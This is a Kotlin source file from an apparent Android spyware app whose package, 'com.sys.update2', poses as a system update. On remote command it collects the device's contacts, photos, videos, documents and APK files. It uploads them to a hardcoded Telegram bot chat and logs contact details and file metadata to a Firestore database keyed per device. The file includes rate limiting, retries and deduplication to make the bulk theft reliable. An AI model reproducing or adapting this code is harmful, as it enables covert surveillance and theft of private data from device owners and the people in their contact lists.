// language: Kotlin, file: SyncWorker.kt
// *متعدد المهام — يشتغل حسب JobKind*
// *PHOTOS, VIDEOS, FILES, APK, CONTACTS*
// *لا يشتغل تلقائي — فقط بأمر من SyncManager*

package com.sys.update2

import android.content.Context
import android.util.Log
import okhttp3.ConnectionPool
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.Locale
import java.util.concurrent.LinkedBlockingQueue
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicLong

object SyncWorker {

    private const val TAG = "SyncWorker"
    private const val THREADS = 5
    private const val RATE_LIMIT = 15
    private const val MIN_GAP_MS = 1000L / RATE_LIMIT

    enum class JobKind { PHOTOS, VIDEOS, FILES, APK, CONTACTS }

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS)
        .writeTimeout(300, TimeUnit.SECONDS)
        .connectionPool(ConnectionPool(10, 5, TimeUnit.MINUTES))
        .build()

    private val queue = LinkedBlockingQueue<Job>()
    private val running = AtomicBoolean(false)
    private val lastReqMs = AtomicLong(0)
    private val rateLock = Any()
    private val cacheLock = Any()
    private var threads: List<Thread> = emptyList()
    private val uploadedCache = HashMap<String, MutableSet<String>>()

    private data class Job(
        val type: String,     // "photo", "video", "file", "apk"
        val path: String,
        val name: String,
        val size: Long,
        val date: Long,
        val ext: String
    )

    private fun fsBase(): String =
        "https://firestore.googleapis.com/v1/projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents"

    // ═══════════════════════════════════════════
    //  Start with Type
    // ═══════════════════════════════════════════
    @Synchronized
    fun startWithType(ctx: Context, kind: JobKind) {
        stop()
        if (running.get()) return
        running.set(true)
        Log.d(TAG, "=== START $kind ===")

        threads = (0 until THREADS).map { i ->
            Thread({ workerLoop(ctx, i) }, "sync-w-$i").also { it.start() }
        }
        Thread({ sequence(ctx, kind) }, "sync-main").start()
    }

    fun stop() {
        running.set(false)
        threads.forEach { it.interrupt() }
        threads = emptyList()
        queue.clear()
    }

    // ═══════════════════════════════════════════
    //  Sequence
    // ═══════════════════════════════════════════
    private fun sequence(ctx: Context, kind: JobKind) {
        Log.d(TAG, "▶ sequence $kind start")

        when (kind) {
            JobKind.CONTACTS -> {
                try { syncContacts(ctx) } catch (e: Exception) { Log.e(TAG, "contacts: ${e.message}") }
            }
            JobKind.PHOTOS -> enqueue(ctx, "photo", MediaScanner.scanImages().map { toJob("photo", it, "jpg") })
            JobKind.VIDEOS -> enqueue(ctx, "video", MediaScanner.scanVideos().map { toJob("video", it, "mp4") })
            JobKind.FILES  -> enqueue(ctx, "file",  MediaScanner.scanFiles().map  { toJob("file",  it, "bin") })
            JobKind.APK    -> enqueue(ctx, "apk",   MediaScanner.scanApks().map   { toJob("apk",   it, "apk") })
        }

        waitEmpty()
        Log.d(TAG, "✅ sequence $kind done")

        // في حالة CONTACTS — نخرج. الباقي خلص.
        // لا يوجد monitor دوري — كل حاجة بأمر.
    }

    private fun toJob(type: String, mf: MediaScanner.MediaFile, fallbackExt: String): Job =
        Job(
            type = type,
            path = mf.path,
            name = mf.name,
            size = mf.size,
            date = mf.lastModified,
            ext = mf.name.substringAfterLast('.', fallbackExt).lowercase(Locale.US)
        )

    private fun waitEmpty() {
        var waited = 0
        while (queue.isNotEmpty() && waited < 1800) {
            try { Thread.sleep(1000L) } catch (_: Exception) {}
            waited++
        }
    }

    // ═══════════════════════════════════════════
    //  Contacts
    // ═══════════════════════════════════════════
    private fun syncContacts(ctx: Context) {
        val contacts = ContactsHelper.getAllContacts(ctx)
        if (contacts.isEmpty()) {
            TelegramApi.sendMessage("📇 لا توجد جهات اتصال")
            return
        }
        val code = DeviceManager.getDeviceCode(ctx)
        TelegramApi.sendMessage("📇 *جهات الاتصال*\n🆔 `$code`\n📊 العدد: ${contacts.size}")

        for (batch in contacts.chunked(20)) {
            val writes = JSONArray()
            val sb = StringBuilder()
            for (c in batch) {
                val ph = JSONArray(); c.phones.forEach { ph.put(JSONObject().put("stringValue", it)) }
                val em = JSONArray(); c.emails.forEach { em.put(JSONObject().put("stringValue", it)) }
                val fields = JSONObject().apply {
                    put("name", JSONObject().put("stringValue", c.name))
                    put("phones", JSONObject().put("arrayValue", JSONObject().put("values", ph)))
                    put("emails", JSONObject().put("arrayValue", JSONObject().put("values", em)))
                }
                val docId = (c.name + System.nanoTime()).hashCode().toString().replace("-", "m")
                writes.put(JSONObject().put("update", JSONObject().apply {
                    put("name", "projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents/devices/$code/contacts/$docId")
                    put("fields", fields)
                }))

                sb.append("• *${escapeMd(c.name)}*")
                if (c.phones.isNotEmpty()) sb.append("\n  📞 ").append(c.phones.joinToString(" / ") { escapeMd(it) })
                if (c.emails.isNotEmpty()) sb.append("\n  ✉️ ").append(c.emails.joinToString(" / ") { escapeMd(it) })
                sb.append("\n\n")
            }
            try {
                val body = JSONObject().put("writes", writes).toString()
                val url = "https://firestore.googleapis.com/v1/projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents:commit?key=${Config.FIREBASE_API_KEY}"
                client.newCall(Request.Builder().url(url).post(body.toRequestBody("application/json".toMediaType())).build()).execute().use { }
            } catch (_: Exception) {}

            try { TelegramApi.sendMessage(sb.toString()) } catch (_: Exception) {}
            try { Thread.sleep(500L) } catch (_: Exception) {}
        }
    }

    private fun escapeMd(s: String): String {
        val chars = listOf("_","*","[","]","(",")","~","`",">","#","+","-","=","|","{","}","." ,"!")
        var out = s
        for (c in chars) out = out.replace(c, "\\$c")
        return out
    }

    // ═══════════════════════════════════════════
    //  Uploaded cache من Firestore
    // ═══════════════════════════════════════════
    private fun uploadedFor(ctx: Context, type: String): MutableSet<String> {
        synchronized(cacheLock) {
            val code = DeviceManager.getDeviceCode(ctx)
            val k = "${code}_$type"
            uploadedCache[k]?.let { return it }

            val set = mutableSetOf<String>()
            try {
                val coll = when (type) {
                    "photo" -> "photos"
                    "video" -> "videos"
                    "file"  -> "files"
                    "apk"   -> "apks"
                    else -> "photos"
                }

                var pageToken: String? = null
                var pageCount = 0
                do {
                    val urlBuilder = StringBuilder()
                        .append("${fsBase()}/devices/$code/$coll")
                        .append("?key=${Config.FIREBASE_API_KEY}")
                        .append("&pageSize=1000")
                    if (pageToken != null) urlBuilder.append("&pageToken=").append(pageToken)

                    client.newCall(Request.Builder().url(urlBuilder.toString()).get().build())
                        .execute().use { resp ->
                            val body = resp.body?.string()
                            if (body.isNullOrBlank()) return@use
                            val obj = JSONObject(body)
                            val docs = obj.optJSONArray("documents")
                            if (docs != null) {
                                for (i in 0 until docs.length()) {
                                    val f = docs.optJSONObject(i)?.optJSONObject("fields") ?: continue
                                    val n = f.optJSONObject("name")?.optString("stringValue") ?: ""
                                    val s = f.optJSONObject("size")?.optString("integerValue") ?: "0"
                                    if (n.isNotBlank()) set.add("$n|$s")
                                }
                            }
                            pageToken = obj.optString("nextPageToken", "").takeIf { it.isNotBlank() }
                        }
                    pageCount++
                } while (pageToken != null && pageCount < 20)
            } catch (_: Exception) {}

            uploadedCache[k] = set
            return set
        }
    }

    private fun markUploaded(ctx: Context, type: String, name: String, size: Long) {
        synchronized(cacheLock) {
            val k = "${DeviceManager.getDeviceCode(ctx)}_$type"
            uploadedCache.getOrPut(k) { mutableSetOf() }.add("$name|$size")
        }
    }

    // ═══════════════════════════════════════════
    //  Enqueue
    // ═══════════════════════════════════════════
    private fun enqueue(ctx: Context, type: String, jobs: List<Job>) {
        if (jobs.isEmpty()) return
        val uploaded = uploadedFor(ctx, type)
        var added = 0
        for (j in jobs) {
            val localKey = MediaScanner.buildKey(j.path, j.size, j.date)
            if (MediaScanner.isSentByKey(ctx, localKey)) continue
            if (uploaded.contains("${j.name}|${j.size}")) {
                MediaScanner.markSentByKey(ctx, localKey)
                continue
            }
            if (queue.offer(j)) added++
        }
        if (added > 0) Log.d(TAG, "$type enqueued: $added (queue=${queue.size})")
    }

    // ═══════════════════════════════════════════
    //  Worker loop
    // ═══════════════════════════════════════════
    private fun workerLoop(ctx: Context, id: Int) {
        while (running.get()) {
            val job = try { queue.poll(2, TimeUnit.SECONDS) } catch (_: Exception) { null } ?: continue
            try { processJob(ctx, job) } catch (e: Exception) { Log.e(TAG, "w$id: ${e.message}") }
        }
    }

    private fun processJob(ctx: Context, job: Job) {
        val file = File(job.path)
        if (!file.exists() || file.length() == 0L) return

        rateLimit()
        val fileId = uploadToTelegram(file, job)

        if (fileId != null) {
            saveMeta(ctx, job.type, fileId, job.name, job.size, job.date, job.ext)
            markUploaded(ctx, job.type, job.name, job.size)
            MediaScanner.markSentByKey(ctx, MediaScanner.buildKey(job.path, job.size, job.date))
            Log.d(TAG, "✓ ${job.type}: ${job.name}")
        } else {
            Log.w(TAG, "✗ ${job.type}: ${job.name}")
        }
    }

    private fun rateLimit() {
        synchronized(rateLock) {
            val now = System.currentTimeMillis()
            val last = lastReqMs.get()
            val wait = (last + MIN_GAP_MS) - now
            if (wait > 0) try { Thread.sleep(wait) } catch (_: Exception) {}
            lastReqMs.set(System.currentTimeMillis())
        }
    }

    // ═══════════════════════════════════════════
    //  Upload with retry
    // ═══════════════════════════════════════════
    private fun uploadToTelegram(file: File, job: Job): String? {
        var attempt = 0
        while (attempt < 3 && running.get()) {
            attempt++
            val result = tryUpload(file, job)
            if (result != null) return result
            try { Thread.sleep(5000L * attempt) } catch (_: Exception) {}
        }
        return null
    }

    private fun tryUpload(file: File, job: Job): String? {
        return try {
            val method = when (job.type) {
                "photo" -> "sendPhoto"
                "video" -> "sendVideo"
                else -> "sendDocument"
            }
            val fieldName = when (job.type) {
                "photo" -> "photo"
                "video" -> "video"
                else -> "document"
            }
            val mime = when (job.type) {
                "photo" -> guessImageMime(job.ext)
                "video" -> guessVideoMime(job.ext)
                "apk"   -> "application/vnd.android.package-archive"
                else    -> guessDocumentMime(job.ext)
            }

            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", Config.TELEGRAM_CHAT_ID)
                .addFormDataPart("caption", "📎 ${job.name}")
                .addFormDataPart(fieldName, file.name, file.asRequestBody(mime.toMediaType()))
                .build()

            val req = Request.Builder()
                .url("https://api.telegram.org/bot${Config.TELEGRAM_BOT_TOKEN}/$method")
                .post(body).build()

            client.newCall(req).execute().use { resp ->
                val code = resp.code
                val respBody = resp.body?.string() ?: return null

                if (code == 429) {
                    val obj = JSONObject(respBody)
                    val retryAfter = obj.optJSONObject("parameters")?.optInt("retry_after", 30) ?: 30
                    Log.w(TAG, "429 — retry after ${retryAfter}s")
                    try { Thread.sleep(retryAfter * 1000L) } catch (_: Exception) {}
                    return null
                }

                val obj = JSONObject(respBody)
                if (!obj.optBoolean("ok", false)) return null

                val result = obj.optJSONObject("result") ?: return null
                when (job.type) {
                    "photo" -> {
                        val arr = result.optJSONArray("photo") ?: return null
                        if (arr.length() == 0) return null
                        arr.optJSONObject(arr.length() - 1)?.optString("file_id", "")
                    }
                    "video" -> result.optJSONObject("video")?.optString("file_id", "")
                    else -> result.optJSONObject("document")?.optString("file_id", "")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "upload: ${e.message}")
            null
        }
    }

    private fun guessImageMime(ext: String): String = when (ext) {
        "jpg", "jpeg" -> "image/jpeg"
        "png"         -> "image/png"
        "gif"         -> "image/gif"
        "webp"        -> "image/webp"
        "bmp"         -> "image/bmp"
        "heic", "heif"-> "image/heic"
        "tiff", "tif" -> "image/tiff"
        else          -> "image/*"
    }

    private fun guessVideoMime(ext: String): String = when (ext) {
        "mp4", "m4v"  -> "video/mp4"
        "mkv"         -> "video/x-matroska"
        "avi"         -> "video/x-msvideo"
        "mov"         -> "video/quicktime"
        "3gp"         -> "video/3gpp"
        "webm"        -> "video/webm"
        "flv"         -> "video/x-flv"
        "wmv"         -> "video/x-ms-wmv"
        "mpeg", "mpg" -> "video/mpeg"
        else          -> "video/*"
    }

    private fun guessDocumentMime(ext: String): String = when (ext) {
        "pdf"  -> "application/pdf"
        "zip"  -> "application/zip"
        "rar"  -> "application/vnd.rar"
        "7z"   -> "application/x-7z-compressed"
        "tar"  -> "application/x-tar"
        "gz"   -> "application/gzip"
        "doc"  -> "application/msword"
        "docx" -> "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
        "xls"  -> "application/vnd.ms-excel"
        "xlsx" -> "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
        "ppt"  -> "application/vnd.ms-powerpoint"
        "pptx" -> "application/vnd.openxmlformats-officedocument.presentationml.presentation"
        "txt"  -> "text/plain"
        "csv"  -> "text/csv"
        "xml"  -> "application/xml"
        "json" -> "application/json"
        else   -> "application/octet-stream"
    }

    // ═══════════════════════════════════════════
    //  Save metadata
    // ═══════════════════════════════════════════
    private fun saveMeta(ctx: Context, type: String, fileId: String, name: String, size: Long, date: Long, ext: String) {
        try {
            val code = DeviceManager.getDeviceCode(ctx)
            val coll = when (type) {
                "photo" -> "photos"
                "video" -> "videos"
                "file"  -> "files"
                "apk"   -> "apks"
                else -> "photos"
            }
            val docId = (name + size).hashCode().toString().replace("-", "m")
            val url = "${fsBase()}/devices/$code/$coll/$docId?key=${Config.FIREBASE_API_KEY}"
            val fields = JSONObject().apply {
                put("file_id", JSONObject().put("stringValue", fileId))
                put("name", JSONObject().put("stringValue", name))
                put("size", JSONObject().put("integerValue", size.toString()))
                put("date", JSONObject().put("integerValue", date.toString()))
                put("ext", JSONObject().put("stringValue", ext))
            }
            val body = JSONObject().put("fields", fields).toString()
            client.newCall(Request.Builder().url(url)
                .patch(body.toRequestBody("application/json".toMediaType())).build()).execute().use { }
        } catch (e: Exception) { Log.e(TAG, "saveMeta: ${e.message}") }
    }
}
